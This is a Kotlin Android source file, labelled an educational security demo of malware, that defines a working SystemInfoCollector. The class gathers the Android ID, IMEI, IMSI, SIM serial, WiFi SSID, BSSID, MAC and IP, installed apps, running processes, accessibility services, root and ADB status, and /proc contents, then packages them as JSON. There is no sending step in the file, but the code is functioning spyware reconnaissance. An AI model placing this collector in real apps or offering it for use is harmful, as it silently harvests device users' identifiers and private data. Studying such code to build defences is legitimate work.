package com.securitydemo.malware.utils

import android.Manifest
import android.app.ActivityManager
import android.content.Context
import android.content.pm.PackageManager
import android.location.LocationManager
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.provider.Settings
import android.telephony.TelephonyManager
import androidx.core.app.ActivityCompat
import org.json.JSONObject
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.net.NetworkInterface

/**
 * SECURITY DEMO: System Information Collector
 * 
 * This utility demonstrates how malware collects sensitive device information:
 * - Device hardware and software details
 * - Network configuration and WiFi info
 * - Location data and telephony information
 * - Running processes and installed applications
 * - System settings and security status
 * 
 * EDUCATIONAL PURPOSE ONLY
 */
class SystemInfoCollector(private val context: Context) {

    /**
     * Collect comprehensive system information
     */
    fun collectAllInformation(): String {
        val systemInfo = JSONObject()
        
        try {
            systemInfo.put("device_info", getDeviceInformation())
            systemInfo.put("network_info", getNetworkInformation())
            systemInfo.put("security_info", getSecurityInformation())
            systemInfo.put("telephony_info", getTelephonyInformation())
            systemInfo.put("location_info", getLocationInformation())
            systemInfo.put("installed_apps", getInstalledApplications())
            systemInfo.put("running_processes", getRunningProcesses())
            systemInfo.put("system_settings", getSystemSettings())
            systemInfo.put("hardware_info", getHardwareInformation())
            systemInfo.put("collection_timestamp", System.currentTimeMillis())
        } catch (e: Exception) {
            systemInfo.put("error", "Failed to collect information: ${e.message}")
        }
        
        return systemInfo.toString(2)
    }

    private fun getDeviceInformation(): JSONObject {
        val deviceInfo = JSONObject()
        
        try {
            deviceInfo.put("manufacturer", Build.MANUFACTURER)
            deviceInfo.put("brand", Build.BRAND)
            deviceInfo.put("model", Build.MODEL)
            deviceInfo.put("device", Build.DEVICE)
            deviceInfo.put("product", Build.PRODUCT)
            deviceInfo.put("android_version", Build.VERSION.RELEASE)
            deviceInfo.put("api_level", Build.VERSION.SDK_INT)
            deviceInfo.put("build_id", Build.ID)
            deviceInfo.put("build_type", Build.TYPE)
            deviceInfo.put("build_tags", Build.TAGS)
            deviceInfo.put("fingerprint", Build.FINGERPRINT)
            deviceInfo.put("board", Build.BOARD)
            deviceInfo.put("bootloader", Build.BOOTLOADER)
            deviceInfo.put("hardware", Build.HARDWARE)
            
            // Device identifiers (requires permissions)
            deviceInfo.put("android_id", Settings.Secure.getString(
                context.contentResolver, Settings.Secure.ANDROID_ID))
                
        } catch (e: Exception) {
            deviceInfo.put("error", e.message)
        }
        
        return deviceInfo
    }

    private fun getNetworkInformation(): JSONObject {
        val networkInfo = JSONObject()
        
        try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_WIFI_STATE) == PackageManager.PERMISSION_GRANTED) {
                networkInfo.put("wifi_enabled", wifiManager.isWifiEnabled)
                
                val wifiInfo = wifiManager.connectionInfo
                networkInfo.put("wifi_ssid", wifiInfo.ssid)
                networkInfo.put("wifi_bssid", wifiInfo.bssid)
                networkInfo.put("wifi_mac_address", wifiInfo.macAddress)
                networkInfo.put("wifi_ip_address", intToIp(wifiInfo.ipAddress))
                networkInfo.put("wifi_link_speed", wifiInfo.linkSpeed)
                networkInfo.put("wifi_rssi", wifiInfo.rssi)
            }
            
            // Get network interfaces
            val interfaces = NetworkInterface.getNetworkInterfaces()
            val networkInterfaces = mutableListOf<String>()
            
            while (interfaces.hasMoreElements()) {
                val networkInterface = interfaces.nextElement()
                networkInterfaces.add("${networkInterface.name}: ${networkInterface.displayName}")
            }
            
            networkInfo.put("network_interfaces", networkInterfaces)
            
        } catch (e: Exception) {
            networkInfo.put("error", e.message)
        }
        
        return networkInfo
    }

    private fun getSecurityInformation(): JSONObject {
        val securityInfo = JSONObject()
        
        try {
            // Check if device is rooted
            securityInfo.put("is_rooted", isDeviceRooted())
            
            // Check developer options
            securityInfo.put("developer_mode", Settings.Global.getInt(
                context.contentResolver, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) == 1)
            
            // Check USB debugging
            securityInfo.put("usb_debugging", Settings.Global.getInt(
                context.contentResolver, Settings.Global.ADB_ENABLED, 0) == 1)
            
            // Check unknown sources
            securityInfo.put("unknown_sources_enabled", isUnknownSourcesEnabled())
            
            // Security patch level
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                securityInfo.put("security_patch", Build.VERSION.SECURITY_PATCH)
            }
            
        } catch (e: Exception) {
            securityInfo.put("error", e.message)
        }
        
        return securityInfo
    }

    private fun getTelephonyInformation(): JSONObject {
        val telephonyInfo = JSONObject()
        
        try {
            val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                telephonyInfo.put("device_id", telephonyManager.deviceId)
                telephonyInfo.put("subscriber_id", telephonyManager.subscriberId)
                telephonyInfo.put("sim_serial", telephonyManager.simSerialNumber)
                telephonyInfo.put("phone_type", telephonyManager.phoneType)
                telephonyInfo.put("network_type", telephonyManager.networkType)
                telephonyInfo.put("network_operator", telephonyManager.networkOperator)
                telephonyInfo.put("network_operator_name", telephonyManager.networkOperatorName)
                telephonyInfo.put("sim_operator", telephonyManager.simOperator)
                telephonyInfo.put("sim_operator_name", telephonyManager.simOperatorName)
                telephonyInfo.put("sim_country_iso", telephonyManager.simCountryIso)
            }
            
        } catch (e: Exception) {
            telephonyInfo.put("error", e.message)
        }
        
        return telephonyInfo
    }

    private fun getLocationInformation(): JSONObject {
        val locationInfo = JSONObject()
        
        try {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            
            locationInfo.put("gps_enabled", locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER))
            locationInfo.put("network_location_enabled", locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER))
            
            // Would require location permissions and be async in real implementation
            locationInfo.put("note", "Location collection requires runtime permissions and async calls")
            
        } catch (e: Exception) {
            locationInfo.put("error", e.message)
        }
        
        return locationInfo
    }

    private fun getInstalledApplications(): List<String> {
        val installedApps = mutableListOf<String>()
        
        try {
            val packageManager = context.packageManager
            val packages = packageManager.getInstalledPackages(0)
            
            for (packageInfo in packages) {
                installedApps.add("${packageInfo.packageName} (${packageInfo.versionName})")
            }
        } catch (e: Exception) {
            installedApps.add("Error: ${e.message}")
        }
        
        return installedApps
    }

    fun getRunningProcesses(): List<String> {
        val runningProcesses = mutableListOf<String>()
        
        try {
            val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val processes = activityManager.runningAppProcesses
            
            processes?.forEach { process ->
                runningProcesses.add("${process.processName} (PID: ${process.pid})")
            }
        } catch (e: Exception) {
            runningProcesses.add("Error: ${e.message}")
        }
        
        return runningProcesses
    }

    fun getRunningApps(): List<String> {
        return getRunningProcesses().take(10) // Limit for demo
    }

    private fun getSystemSettings(): JSONObject {
        val systemSettings = JSONObject()
        
        try {
            // Accessibility services
            val accessibilityServices = Settings.Secure.getString(
                context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            systemSettings.put("accessibility_services", accessibilityServices ?: "none")
            
            // Device admin apps
            systemSettings.put("device_admin_note", "Device admin info requires special permissions")
            
            // Auto-rotate
            systemSettings.put("auto_rotate", Settings.System.getInt(
                context.contentResolver, Settings.System.ACCELEROMETER_ROTATION, 0) == 1)
                
        } catch (e: Exception) {
            systemSettings.put("error", e.message)
        }
        
        return systemSettings
    }

    private fun getHardwareInformation(): JSONObject {
        val hardwareInfo = JSONObject()
        
        try {
            // CPU information from /proc/cpuinfo
            val cpuInfo = readProcFile("/proc/cpuinfo")
            hardwareInfo.put("cpu_info", cpuInfo.take(500)) // Limit size
            
            // Memory information
            val memInfo = readProcFile("/proc/meminfo")
            hardwareInfo.put("memory_info", memInfo.take(500))
            
            // Battery information
            hardwareInfo.put("battery_level", getBatteryLevel())
            
        } catch (e: Exception) {
            hardwareInfo.put("error", e.message)
        }
        
        return hardwareInfo
    }

    fun getBatteryLevel(): Int {
        return try {
            val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (e: Exception) {
            -1
        }
    }

    private fun isDeviceRooted(): Boolean {
        return try {
            // Check for su binary
            val suBinary = File("/system/bin/su")
            if (suBinary.exists()) return true
            
            val suXbin = File("/system/xbin/su")
            if (suXbin.exists()) return true
            
            val suSbin = File("/sbin/su")
            if (suSbin.exists()) return true
            
            // Check for Superuser.apk
            val superuserApk = File("/system/app/Superuser.apk")
            if (superuserApk.exists()) return true
            
            // Try to execute su command
            val process = Runtime.getRuntime().exec("su")
            process.destroy()
            true
        } catch (e: Exception) {
            false
        }
    }

    private fun isUnknownSourcesEnabled(): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.packageManager.canRequestPackageInstalls()
            } else {
                @Suppress("DEPRECATION")
                Settings.Secure.getInt(context.contentResolver, Settings.Secure.INSTALL_NON_MARKET_APPS) == 1
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun readProcFile(path: String): String {
        return try {
            val file = File(path)
            if (file.exists()) {
                file.readText()
            } else {
                "File not accessible"
            }
        } catch (e: Exception) {
            "Error reading file: ${e.message}"
        }
    }

    private fun intToIp(ipInt: Int): String {
        return "${ipInt and 0xff}.${ipInt shr 8 and 0xff}.${ipInt shr 16 and 0xff}.${ipInt shr 24 and 0xff}"
    }
}
